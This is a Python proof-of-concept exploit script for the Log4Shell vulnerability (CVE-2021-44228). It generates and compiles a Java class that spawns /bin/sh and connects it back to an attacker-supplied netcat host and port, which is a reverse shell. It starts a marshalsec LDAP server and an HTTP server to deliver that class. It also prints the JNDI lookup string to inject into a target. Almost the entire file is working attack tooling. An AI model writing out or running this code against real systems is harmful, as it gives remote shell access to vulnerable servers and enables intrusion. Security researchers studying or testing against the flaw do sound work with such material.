import subprocess
import sys
import argparse
from colorama import Fore, init
import subprocess
import threading

from http.server import HTTPServer, SimpleHTTPRequestHandler

init(autoreset=True)

def listToString(s):
    str1 = ""
    try:
      for ele in s:
        str1 += ele
      return str1
    except Exception as ex:
      parser.print_help()
      sys.exit()
    

def payload(webip , webport , ncip, ncport):

  genExploit = (
      """
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

  public Exploit() throws Exception {
    String host="%s";
    int port=%s;
    String cmd="/bin/sh";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()) {
      while(pi.available()>0)
        so.write(pi.read());
      while(pe.available()>0)
        so.write(pe.read());
      while(si.available()>0)
        po.write(si.read());
      so.flush();
      po.flush();
      Thread.sleep(50);
      try {
        p.exitValue();
        break;
      }
      catch (Exception e){
      }
    };
    p.destroy();
    s.close();
  }
}
  """) % (ncip, ncport)

  # writing the exploit to Exploit.java file 

  try:
    f = open("Exploit.java", "w")
    f.write(genExploit)
    f.close()
    print(Fore.GREEN + '[+] Exploit java class created success')

  except Exception as e:
    print(Fore.RED + f'[-] Something went wrong {e.toString()}')

  checkJavaAvailible()
  print(Fore.GREEN + '[+] Setting up LDAP server\n')

  # create the LDAP server on new thread
  t1 = threading.Thread(target=createLdapServer, args=(webip,webport))
  t1.start()

  # start the web server
    
  print(f"[+] Starting the Web server on port {webport} http://0.0.0.0:{webport}")
  httpd = HTTPServer(('0.0.0.0', int(webport)), SimpleHTTPRequestHandler)
  httpd.serve_forever()



def checkJavaAvailible():
  javaver = subprocess.call(['./jdk1.8.0_20/bin/java', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
  if(javaver != 0):
    print(Fore.RED + '[-] Java is not installed inside the repository ')
    sys.exit()
  

def createLdapServer(webip, ncport):
  sendme = ("${jndi:ldap://%s:1389/a}") % (webip)
  print(Fore.GREEN +"[+] Send me: "+sendme+"\n")

  subprocess.run(["./jdk1.8.0_20/bin/javac", "Exploit.java"])

  url = "http://{}:{}/#Exploit".format(webip, ncport)
  subprocess.run(["./jdk1.8.0_20/bin/java", "-cp",
                 "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", url])
 

def header():
  print(Fore.BLUE+"""
[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc
""")

if __name__ == "__main__":
  header()

  try:
    parser = argparse.ArgumentParser(description='please enter the values ')

    parser.add_argument('--webip', metavar='webip', type=str,
                        nargs='+', help='Enter IP for LDAPRefServer & Shell')

    parser.add_argument('--webport', metavar='webport', type=str,
                        nargs='+', help='listener port for HTTP port')

    parser.add_argument('--ncip', metavar='ncip', type=str,
                        nargs='+', help='Netcat IP')

    parser.add_argument('--ncport', metavar='ncport', type=str,
                        nargs='+', help='Netcat Port')

    args = parser.parse_args()

    payload(listToString(args.webip), listToString(args.webport), listToString(args.ncip), listToString(args.ncport))

  except KeyboardInterrupt:
    print(Fore.RED + "user interupted the program.")
    sys.exit(0)
